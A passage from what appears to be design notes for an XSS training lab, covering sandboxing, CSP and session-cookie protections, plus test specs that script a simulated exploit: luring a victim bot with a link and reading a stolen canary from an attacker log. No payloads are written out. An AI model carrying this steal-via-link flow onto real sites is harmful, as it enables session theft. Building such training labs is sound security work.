  (`default-src 'none'`), and a shim that turns `hvwa()` and `alert()` into a text banner naming the player's own
  marker. Checked in headless Chrome 157. A route-scoped CSP on the lab page applies inside it too, because srcdoc
  inherits it.
- `hvwa_sid` is HttpOnly and `SameSite=Lax`: no script anywhere reads the player's session.
- Raw lab input reaches only the preview frame; everything else is escaped. Residual risk, accepted: all labs share
  the loopback origin, so a payload the player pastes into their own address bar or devtools can script their own
  platform page.
- No route-scoped header helper exists yet (`core/http.ts setLabHeaders` is engine task E1). Until then a Divine
  level that adds CSP sets the header on its own route only, never globally.

### Testing

- **The guard (`tests/xss.spec.ts`).** It holds the sink matrix, escaped negatives, mXSS corpora, marker reachability,
  per-player isolation, bounds, `linkSinks` and the preview's attributes. It also guards imports: `core/xss/` imports
  only parse5 and `sim/limits.ts` (the copying clip), with no dynamic `import()`, no network, file system, `vm`,
  `child_process` or code-loading global; parse5 and entities import no Node builtin at all; `core/sim/` never
  reaches `core/xss/`.
- **The victim wrap (`tests/xss-victim.spec.ts`).** In process: what renders, what fires, the canary, content types,
  CSP sandbox, the `dom` twin and its hash.
- **A lab spec**, like XV-01, scripts the exploit as a player would. It reads the marker from the page (put it in
  `<code data-marker>`), sends the link (`POST <lab>/victim/send-link`), reads the canary from the attacker log
  (`attackerHits(html)`, the hit whose URL starts with `XSS_STEAL_URL`), then completes the attack.
- **Add these cases:**
  - the preview's srcdoc ends with `<body>` + the level's fragment + `</body></html>`;
  - `xssOracle(labPage.text, marker)` finds the marker sinks only `isolated` (the payload never runs on the platform
    page);
  - Divine's librarian saw the marker as text (`labFor(...).admin.verdicts`: `reachedMarker` true, `fired` false);
  - players and levels are isolated;
  - a logout link does not wedge the victim (re-arm).
